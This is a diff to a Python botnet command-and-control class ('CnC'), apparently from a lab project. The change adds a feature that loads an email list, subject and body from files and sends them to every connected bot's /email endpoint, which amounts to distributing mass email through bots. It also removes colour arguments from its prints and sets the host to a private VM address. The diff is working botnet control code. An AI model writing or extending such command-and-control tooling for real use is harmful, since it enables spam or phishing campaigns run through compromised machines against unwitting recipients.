@@ -181,8 +181,12 @@ class CnC:
                 return "No bot connected."
             with open(file[0], 'r') as f:
                 emails = json.load(f)
+            with open(file[1], 'r', encoding='utf-8') as f:
+                subj, txt = f.read().split('\n\n', 1)
+
+            to_send = {'emails': emails, 'subj': subj, 'txt': txt}
             responses = {
-                requests.post(f"http://{address}:{port}/email", json={'url': emails}).status_code
+                requests.post(f"http://{address}:{port}/email", json=to_send).status_code
                 for address, port in self.__bots.items()
             }
         if len(responses) == 1 and responses.pop() != 200:
@@ -204,12 +208,12 @@ class CnC:
         stop = threading.Event()
         bot_conn = threading.Thread(target=CnC.__bot_connection, args=(cnc, stop))
         bot_conn.start()
-        print("Botnet started...", "green")
+        print("Botnet started...")
 
         cmd = 0
 
         while cmd != "exit":
-            print("\n('help' to view the commands list).", 'yellow')
+            print("\n('help' to view the commands list).")
             cmd = str.lower(input("\n> "))
             result = self.__run_cmd(cmd)
             print(result)
@@ -235,7 +239,7 @@ class CnC:
             return "Command not recognized."
 
 
-HOST = '127.0.0.1'
+HOST = '10.0.2.15'
 PORT = 60000
 
 if __name__ == '__main__':
